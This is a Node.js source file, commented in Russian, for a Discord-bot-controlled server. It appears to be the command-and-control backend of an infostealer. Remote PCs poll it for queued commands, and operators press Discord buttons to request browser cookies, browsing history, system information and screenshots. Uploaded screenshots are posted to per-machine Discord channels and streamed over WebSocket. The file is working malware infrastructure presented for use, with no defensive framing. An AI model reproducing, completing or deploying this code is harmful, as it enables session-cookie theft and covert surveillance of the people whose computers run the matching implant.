import express from "express";
import { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, ChannelType } from "discord.js";
import { WebSocketServer } from "ws";
import http from "http";
import { fileURLToPath } from "url";
import { dirname, join } from "path";

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

const app = express();
app.use(express.json({ limit: "50mb" }));

const DISCORD_BOT_TOKEN = process.env.DISCORD_BOT_TOKEN;
const GUILD_ID = process.env.GUILD_ID;
const CATEGORY_NAME = "Все ПК";
const ONLINE_TIMEOUT = 3 * 60 * 1000;

// ---------- Состояние ----------
const onlinePCs = {};
const pendingCommands = {};
const channelByPC = {};
const wsClients = {};
const messagesWithButtons = {};

// ---------- Discord Bot ----------
const bot = new Client({ intents: [GatewayIntentBits.Guilds] });
bot.once("ready", () => console.log(`✅ Бот вошёл как ${bot.user.tag}`));

// ---------- Кнопки ----------
function createControlButtons(pcId) {
    const safePcId = encodeURIComponent(pcId);
    return [new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(`check_online|${safePcId}`).setLabel("Чек онлайн").setStyle(ButtonStyle.Primary),
        new ButtonBuilder().setCustomId(`get_cookies|${safePcId}`).setLabel("Запросить куки").setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId(`get_history|${safePcId}`).setLabel("Запросить историю").setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId(`get_system|${safePcId}`).setLabel("Системная инфо").setStyle(ButtonStyle.Secondary),
        new ButtonBuilder().setCustomId(`get_screenshot|${safePcId}`).setLabel("Скриншот").setStyle(ButtonStyle.Secondary)
    )];
}

// ---------- Обработка кнопок ----------
bot.on("interactionCreate", async interaction => {
    if(!interaction.isButton()) return;
    const [command, encodedPcId] = interaction.customId.split("|");
    const pcId = decodeURIComponent(encodedPcId);
    const lastPing = onlinePCs[pcId];
    const isOnline = lastPing && (Date.now() - lastPing < ONLINE_TIMEOUT);

    const replyOptions = { ephemeral: true }; // обновленный формат
    if(command === "check_online") {
        replyOptions.content = isOnline ? `✅ ПК ${pcId} онлайн` : `❌ ПК ${pcId} оффлайн`;
        await interaction.reply(replyOptions);
        return;
    }

    if(!isOnline){
        replyOptions.content = `❌ ПК ${pcId} оффлайн`;
        await interaction.reply(replyOptions);
        return;
    }

    if(!pendingCommands[pcId]) pendingCommands[pcId] = [];
    pendingCommands[pcId].push(command);
    replyOptions.content = `✅ Команда "${command}" отправлена ПК ${pcId}`;
    await interaction.reply(replyOptions);
});

// ---------- Категория и канал ----------
async function getOrCreateCategory(guild, name){
    const channels = await guild.channels.fetch();
    let category = channels.find(c => c.type === ChannelType.GuildCategory && c.name === name);
    if(!category) category = await guild.channels.create({ name, type: ChannelType.GuildCategory });
    return category;
}

async function getOrCreateTextChannel(guild, name, parentId){
    const channels = await guild.channels.fetch();
    let channel = channels.find(c => c.type === ChannelType.GuildText && c.name === name && c.parentId === parentId);
    if(!channel) channel = await guild.channels.create({ name, type: ChannelType.GuildText, parent: parentId });
    return channel;
}

// ---------- Приём данных ----------
app.post("/upload", async (req, res) => {
    try {
        const { pcId, screenshot } = req.body;
        if(!pcId) return res.status(400).json({ error:"pcId required" });

        onlinePCs[pcId] = Date.now();
        const guild = await bot.guilds.fetch(GUILD_ID);
        const category = await getOrCreateCategory(guild, CATEGORY_NAME);
        const channel = channelByPC[pcId] ? await guild.channels.fetch(channelByPC[pcId]).catch(()=>null) : null;
        const finalChannel = channel || await getOrCreateTextChannel(guild, pcId, category.id);
        channelByPC[pcId] = finalChannel.id;

        // ---------- Отправка скриншота ----------
        if(screenshot){
            try {
                await finalChannel.send({ files: [{ attachment: Buffer.from(screenshot, "base64"), name: `${pcId}-screenshot.jpeg` }] });
            } catch(e) {
                console.error("Ошибка отправки скриншота:", e);
            }
        }

        // ---------- WS ----------
        if(screenshot && wsClients[pcId]){
            wsClients[pcId].forEach(ws => {
                try { ws.send(screenshot); } catch(e){ }
            });
        }

        res.json({ success:true });
    } catch(err){
        console.error(err);
        res.status(500).json({ error: err.message });
    }
});

// ---------- Пинг ----------
app.post("/ping", (req, res) => {
    const { pcId } = req.body;
    if(!pcId) return res.status(400).json({ error:"pcId required" });
    onlinePCs[pcId] = Date.now();
    const commands = pendingCommands[pcId] || [];
    pendingCommands[pcId] = [];
    res.json({ commands });
});

// ---------- Статика ----------
app.use(express.static(join(__dirname, "public")));

// ---------- WebSocket ----------
const wss = new WebSocketServer({ noServer: true });
wss.on("connection", (ws, req) => {
    const url = new URL(req.url, `http://${req.headers.host}`);
    const pcId = url.searchParams.get("pcId");
    if(!pcId) return ws.close();
    if(!wsClients[pcId]) wsClients[pcId] = [];
    wsClients[pcId].push(ws);
    ws.on("close", () => { wsClients[pcId] = wsClients[pcId].filter(c => c !== ws); });
});

// ---------- HTTP + WS ----------
const server = http.createServer(app);
server.on("upgrade", (request, socket, head) => {
    wss.handleUpgrade(request, socket, head, ws => wss.emit("connection", ws, request));
});

// ---------- Запуск ----------
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`🚀 Сервер слушает порт ${PORT}`));
bot.login(DISCORD_BOT_TOKEN);
